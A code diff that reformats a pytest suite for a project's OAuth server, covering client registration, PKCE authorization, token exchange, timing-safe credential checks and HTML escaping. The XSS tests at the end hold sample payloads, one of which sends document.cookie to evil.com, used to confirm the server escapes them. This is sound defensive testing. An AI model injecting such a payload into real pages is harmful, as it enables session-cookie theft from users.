@@ -4,10 +4,7 @@ from __future__ import annotations
 
 import base64
 import hashlib
-import json
-import tempfile
 import urllib.parse
-from pathlib import Path
 from unittest.mock import MagicMock, patch
 
 import pytest
@@ -17,18 +14,18 @@ from starlette.testclient import TestClient
 @pytest.fixture(autouse=True)
 def reset_stores():
     """Reset all stores between tests."""
+    import valence.server.auth as auth_module
     import valence.server.config as config_module
     import valence.server.oauth_models as oauth_module
-    import valence.server.auth as auth_module
-    
+
     config_module._settings = None
     oauth_module._client_store = None
     oauth_module._code_store = None
     oauth_module._refresh_store = None
     auth_module._token_store = None
-    
+
     yield
-    
+
     config_module._settings = None
     oauth_module._client_store = None
     oauth_module._code_store = None
@@ -41,20 +38,23 @@ def oauth_env(monkeypatch, tmp_path):
     """Set up OAuth environment."""
     token_file = tmp_path / "tokens.json"
     clients_file = tmp_path / "clients.json"
-    
+
     token_file.write_text('{"tokens": []}')
     clients_file.write_text('{"clients": []}')
-    
+
     monkeypatch.setenv("VALENCE_TOKEN_FILE", str(token_file))
     monkeypatch.setenv("VALENCE_OAUTH_ENABLED", "true")
     monkeypatch.setenv("VALENCE_OAUTH_CLIENTS_FILE", str(clients_file))
     # JWT secret must be at least 32 characters
-    monkeypatch.setenv("VALENCE_OAUTH_JWT_SECRET", "test-jwt-secret-for-testing-must-be-at-least-32-chars")
+    monkeypatch.setenv(
+        "VALENCE_OAUTH_JWT_SECRET",
+        "test-jwt-secret-for-testing-must-be-at-least-32-chars",
+    )
     monkeypatch.setenv("VALENCE_OAUTH_USERNAME", "admin")
     monkeypatch.setenv("VALENCE_OAUTH_PASSWORD", "testpass")
     monkeypatch.setenv("VALENCE_EXTERNAL_URL", "http://localhost:8420")
     monkeypatch.setenv("VALENCE_FEDERATION_ENABLED", "false")
-    
+
     return {
         "token_file": token_file,
         "clients_file": clients_file,
@@ -66,15 +66,17 @@ def mock_db():
     """Mock database for health check."""
     mock_cursor = MagicMock()
     mock_cursor.execute.return_value = None
-    
+
     def mock_context(*args, **kwargs):
         class CM:
             def __enter__(self):
                 return mock_cursor
+
             def __exit__(self, *args):
                 pass
+
         return CM()
-    
+
     with patch("valence.core.db.get_cursor", mock_context):
         yield mock_cursor
 
@@ -83,6 +85,7 @@ def mock_db():
 def client(oauth_env, mock_db) -> TestClient:
     """Create test client."""
     from valence.server.app import create_app
+
     app = create_app()
     return TestClient(app, raise_server_exceptions=False)
 
@@ -94,12 +97,10 @@ API_V1 = "/api/v1"
 def generate_pkce_pair():
     """Generate a PKCE code_verifier and code_challenge pair."""
     import secrets
-    
+
     verifier = secrets.token_urlsafe(32)
-    challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(verifier.encode("ascii")).digest()
-    ).rstrip(b"=").decode("ascii")
-    
+    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode("ascii")).digest()).rstrip(b"=").decode("ascii")
+
     return verifier, challenge
 
 
@@ -107,16 +108,17 @@ def generate_pkce_pair():
 # Metadata Endpoint Tests
 # ============================================================================
 
+
 class TestProtectedResourceMetadata:
     """Tests for protected resource metadata endpoint."""
 
     def test_returns_metadata(self, client):
         """Test protected resource metadata response."""
         response = client.get("/.well-known/oauth-protected-resource")
-        
+
         assert response.status_code == 200
         data = response.json()
-        
+
         assert "resource" in data
         assert "authorization_servers" in data
         assert "scopes_supported" in data
@@ -126,7 +128,7 @@ class TestProtectedResourceMetadata:
         """Test that scopes are listed."""
         response = client.get("/.well-known/oauth-protected-resource")
         data = response.json()
-        
+
         assert "mcp:tools" in data["scopes_supported"]
         assert "mcp:resources" in data["scopes_supported"]
         assert "mcp:prompts" in data["scopes_supported"]
@@ -138,10 +140,10 @@ class TestAuthorizationServerMetadata:
     def test_returns_metadata(self, client):
         """Test authorization server metadata response."""
         response = client.get("/.well-known/oauth-authorization-server")
-        
+
         assert response.status_code == 200
         data = response.json()
-        
+
         assert "issuer" in data
         assert "authorization_endpoint" in data
         assert "token_endpoint" in data
@@ -151,7 +153,7 @@ class TestAuthorizationServerMetadata:
         """Test required OAuth metadata fields."""
         response = client.get("/.well-known/oauth-authorization-server")
         data = response.json()
-        
+
         assert data["response_types_supported"] == ["code"]
         assert "authorization_code" in data["grant_types_supported"]
         assert "refresh_token" in data["grant_types_supported"]
@@ -162,6 +164,7 @@ class TestAuthorizationServerMetadata:
 # ============================================================================
 # Dynamic Client Registration Tests
 # ============================================================================
+
 
 class TestClientRegistration:
     """Tests for dynamic client registration."""
@@ -175,10 +178,10 @@ class TestClientRegistration:
                 "client_name": "Test App",
             },
         )
-        
+
         assert response.status_code == 201
         data = response.json()
-        
+
         assert "client_id" in data
         assert data["client_name"] == "Test App"
         assert "http://localhost:3000/callback" in data["redirect_uris"]
@@ -189,7 +192,7 @@ class TestClientRegistration:
             f"{API_V1}/oauth/register",
             json={"client_name": "Test App"},
         )
-        
+
         assert response.status_code == 400
         assert "redirect_uris" in response.json()["error_description"]
 
@@ -202,7 +205,7 @@ class TestClientRegistration:
                 "client_name": "Test App",
             },
         )
-        
+
         assert response.status_code == 400
         assert "invalid_redirect_uri" in response.json()["error"]
 
@@ -215,7 +218,7 @@ class TestClientRegistration:
                 "grant_types": ["client_credentials"],  # Not supported
             },
         )
-        
+
         assert response.status_code == 400
 
     def test_register_client_custom_scope(self, client):
@@ -227,16 +230,16 @@ class TestClientRegistration:
                 "scope": "mcp:tools",
             },
         )
-        
+
         assert response.status_code == 201
         assert response.json()["scope"] == "mcp:tools"
 
     def test_register_client_includes_token_endpoint_auth_method(self, client):
         """Test registration response includes token_endpoint_auth_method.
-        
+
         Per RFC 7591 Section 3.2.1, the registration response SHOULD include
         token_endpoint_auth_method. For public clients, this should be "none".
-        
+
         See GitHub issue #204.
         """
         response = client.post(
@@ -246,10 +249,10 @@ class TestClientRegistration:
                 "client_name": "Test App",
             },
         )
-        
+
         assert response.status_code == 201
         data = response.json()
-        
+
         assert "token_endpoint_auth_method" in data
         assert data["token_endpoint_auth_method"] == "none"
 
@@ -257,6 +260,7 @@ class TestClientRegistration:
 # ============================================================================
 # Authorization Endpoint Tests
 # ============================================================================
+
 
 class TestAuthorization:
     """Tests for authorization endpoint."""
@@ -272,9 +276,9 @@ class TestAuthorization:
             },
         )
         client_id = reg_response.json()["client_id"]
-        
+
         _, challenge = generate_pkce_pair()
-        
+
         response = client.get(
             f"{API_V1}/oauth/authorize",
             params={
@@ -285,7 +289,7 @@ class TestAuthorization:
                 "code_challenge_method": "S256",
             },
         )
-        
+
         assert response.status_code == 200
         assert "Sign In" in response.text or "Valence" in response.text
 
@@ -296,7 +300,7 @@ class TestAuthorization:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         response = client.get(
             f"{API_V1}/oauth/authorize",
             params={
@@ -307,7 +311,7 @@ class TestAuthorization:
             },
             follow_redirects=False,
         )
-        
+
         # Should redirect with error
         assert response.status_code == 302
 
@@ -321,7 +325,7 @@ class TestAuthorization:
                 "code_challenge": "test",
             },
         )
-        
+
         assert response.status_code == 400
         assert "client_id" in response.text.lower()
 
@@ -332,7 +336,7 @@ class TestAuthorization:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         response = client.get(
             f"{API_V1}/oauth/authorize",
             params={
@@ -343,10 +347,9 @@ class TestAuthorization:
             },
             follow_redirects=False,
         )
-        
+
         assert response.status_code == 302
-        assert "PKCE" in response.headers.get("location", "").lower() or \
-               "code_challenge" in response.headers.get("location", "").lower()
+        assert "PKCE" in response.headers.get("location", "").lower() or "code_challenge" in response.headers.get("location", "").lower()
 
     def test_authorize_invalid_redirect_uri(self, client):
         """Test authorization fails with unregistered redirect_uri."""
@@ -355,7 +358,7 @@ class TestAuthorization:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         response = client.get(
             f"{API_V1}/oauth/authorize",
             params={
@@ -365,7 +368,7 @@ class TestAuthorization:
                 "code_challenge": "test",
             },
         )
-        
+
         assert response.status_code == 400
 
     def test_authorize_post_valid_credentials(self, client):
@@ -379,9 +382,9 @@ class TestAuthorization:
             },
         )
         client_id = reg_response.json()["client_id"]
-        
+
         verifier, challenge = generate_pkce_pair()
-        
+
         # Submit login form
         response = client.post(
             f"{API_V1}/oauth/authorize",
@@ -399,7 +402,7 @@ class TestAuthorization:
             },
             follow_redirects=False,
         )
-        
+
         assert response.status_code == 302
         location = response.headers["location"]
         assert "code=" in location
@@ -412,9 +415,9 @@ class TestAuthorization:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         _, challenge = generate_pkce_pair()
-        
+
         response = client.post(
             f"{API_V1}/oauth/authorize",
             params={
@@ -429,35 +432,38 @@ class TestAuthorization:
                 "password": "wrongpassword",
             },
         )
-        
+
         assert response.status_code == 200
         assert "Invalid" in response.text or "error" in response.text.lower()
 
     def test_authorize_uses_timing_safe_comparison(self, client):
         """Test that credential validation uses constant-time comparison.
-        
+
         This prevents timing attacks where an attacker could determine valid
         credentials by measuring response times. See GitHub issue #169.
         """
         import secrets
-        
+
         reg_response = client.post(
             f"{API_V1}/oauth/register",
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         _, challenge = generate_pkce_pair()
-        
+
         # Track calls to secrets.compare_digest
         original_compare_digest = secrets.compare_digest
         compare_digest_calls = []
-        
+
         def tracking_compare_digest(a, b):
             compare_digest_calls.append((a, b))
             return original_compare_digest(a, b)
-        
-        with patch("valence.server.oauth.secrets.compare_digest", side_effect=tracking_compare_digest):
+
+        with patch(
+            "valence.server.oauth.secrets.compare_digest",
+            side_effect=tracking_compare_digest,
+        ):
             response = client.post(
                 f"{API_V1}/oauth/authorize",
                 params={
@@ -473,18 +479,18 @@ class TestAuthorization:
                 },
                 follow_redirects=False,
             )
-        
+
         # Should have called compare_digest for both username and password
         assert len(compare_digest_calls) >= 2, (
             f"Expected at least 2 calls to secrets.compare_digest for timing-safe "
             f"credential comparison, but got {len(compare_digest_calls)} calls"
         )
-        
+
         # Verify the comparison included the credentials
         compared_values = [call[0] for call in compare_digest_calls]
         assert "admin" in compared_values, "Username should be compared with compare_digest"
         assert "testpass" in compared_values, "Password should be compared with compare_digest"
-        
+
         # Should still succeed with valid credentials
         assert response.status_code == 302
 
@@ -492,6 +498,7 @@ class TestAuthorization:
 # ============================================================================
 # Token Endpoint Tests
 # ============================================================================
+
 
 class TestTokenEndpoint:
     """Tests for token endpoint."""
@@ -504,9 +511,9 @@ class TestTokenEndpoint:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         verifier, challenge = generate_pkce_pair()
-        
+
         # Get auth code
         response = client.post(
             f"{API_V1}/oauth/authorize",
@@ -523,19 +530,19 @@ class TestTokenEndpoint:
             },
             follow_redirects=False,
         )
-        
+
         # Extract code from redirect
         location = response.headers["location"]
         parsed = urllib.parse.urlparse(location)
         params = urllib.parse.parse_qs(parsed.query)
         code = params["code"][0]
-        
+
         return code, client_id, verifier
 
     def test_token_authorization_code(self, client):
         """Test exchanging auth code for tokens."""
         code, client_id, verifier = self._get_auth_code(client)
-        
+
         response = client.post(
             f"{API_V1}/oauth/token",
             data={
@@ -546,10 +553,10 @@ class TestTokenEndpoint:
                 "code_verifier": verifier,
             },
         )
-        
+
         assert response.status_code == 200
         data = response.json()
-        
+
         assert "access_token" in data
         assert "refresh_token" in data
         assert data["token_type"] == "Bearer"
@@ -567,14 +574,14 @@ class TestTokenEndpoint:
                 "code_verifier": "some-verifier",
             },
         )
-        
+
         assert response.status_code == 400
         assert response.json()["error"] == "invalid_grant"
 
     def test_token_code_used_twice(self, client):
         """Test that auth codes can only be used once."""
         code, client_id, verifier = self._get_auth_code(client)
-        
+
         # First use succeeds
         response1 = client.post(
             f"{API_V1}/oauth/token",
@@ -587,7 +594,7 @@ class TestTokenEndpoint:
             },
         )
         assert response1.status_code == 200
-        
+
         # Second use fails
         response2 = client.post(
             f"{API_V1}/oauth/token",
@@ -604,7 +611,7 @@ class TestTokenEndpoint:
     def test_token_wrong_pkce_verifier(self, client):
         """Test token fails with wrong PKCE verifier."""
         code, client_id, _ = self._get_auth_code(client)
-        
+
         response = client.post(
             f"{API_V1}/oauth/token",
             data={
@@ -615,14 +622,14 @@ class TestTokenEndpoint:
                 "code_verifier": "wrong-verifier",
             },
         )
-        
+
         assert response.status_code == 400
         assert "PKCE" in response.json().get("error_description", "")
 
     def test_token_refresh(self, client):
         """Test refreshing access token."""
         code, client_id, verifier = self._get_auth_code(client)
-        
+
         # Get initial tokens
         response1 = client.post(
             f"{API_V1}/oauth/token",
@@ -635,7 +642,7 @@ class TestTokenEndpoint:
             },
         )
         refresh_token = response1.json()["refresh_token"]
-        
+
         # Use refresh token
         response2 = client.post(
             f"{API_V1}/oauth/token",
@@ -645,7 +652,7 @@ class TestTokenEndpoint:
                 "client_id": client_id,
             },
         )
-        
+
         assert response2.status_code == 200
         assert "access_token" in response2.json()
 
@@ -658,7 +665,7 @@ class TestTokenEndpoint:
                 "refresh_token": "invalid-token",
             },
         )
-        
+
         assert response.status_code == 400
         assert response.json()["error"] == "invalid_grant"
 
@@ -670,7 +677,7 @@ class TestTokenEndpoint:
                 "grant_type": "client_credentials",
             },
         )
-        
+
         assert response.status_code == 400
         assert response.json()["error"] == "unsupported_grant_type"
 
@@ -683,13 +690,14 @@ class TestTokenEndpoint:
                 # Missing code, client_id, etc.
             },
         )
-        
+
         assert response.status_code == 400
 
 
 # ============================================================================
 # XSS Protection Tests (Issue #42)
 # ============================================================================
+
 
 class TestXSSProtection:
     """Tests for XSS protection in OAuth pages."""
@@ -706,9 +714,9 @@ class TestXSSProtection:
             },
         )
         client_id = reg_response.json()["client_id"]
-        
+
         _, challenge = generate_pkce_pair()
-        
+
         # Request the login page
         response = client.get(
             f"{API_V1}/oauth/authorize",
@@ -720,7 +728,7 @@ class TestXSSProtection:
                 "code_challenge_method": "S256",
             },
         )
-        
+
         assert response.status_code == 200
         # The raw XSS payload should NOT appear in the response
         assert xss_payload not in response.text
@@ -735,17 +743,17 @@ class TestXSSProtection:
             json={"redirect_uris": ["http://localhost/callback"]},
         )
         client_id = reg_response.json()["client_id"]
-        
+
         _, challenge = generate_pkce_pair()
-        
+
         # Submit with wrong credentials to trigger error display
         # The error message is hardcoded, so we test the escaping via
         # the internal function directly
         from valence.server.oauth import _login_page
-        
+
         xss_payload = '<img src=x onerror="alert(1)">'
         html_output = _login_page({}, "Test Client", error=xss_payload)
-        
+
         # The raw XSS payload should NOT appear
         assert xss_payload not in html_output
         # The escaped version should appear
@@ -754,10 +762,10 @@ class TestXSSProtection:
     def test_error_page_xss_escaped(self, client):
         """Test that error page messages are HTML-escaped."""
         from valence.server.oauth import _error_page
-        
+
         xss_payload = '<script>document.location="http://evil.com?c="+document.cookie</script>'
         html_output = _error_page(xss_payload)
-        
+
         # The raw XSS payload should NOT appear
         assert xss_payload not in html_output
         # The escaped version should appear
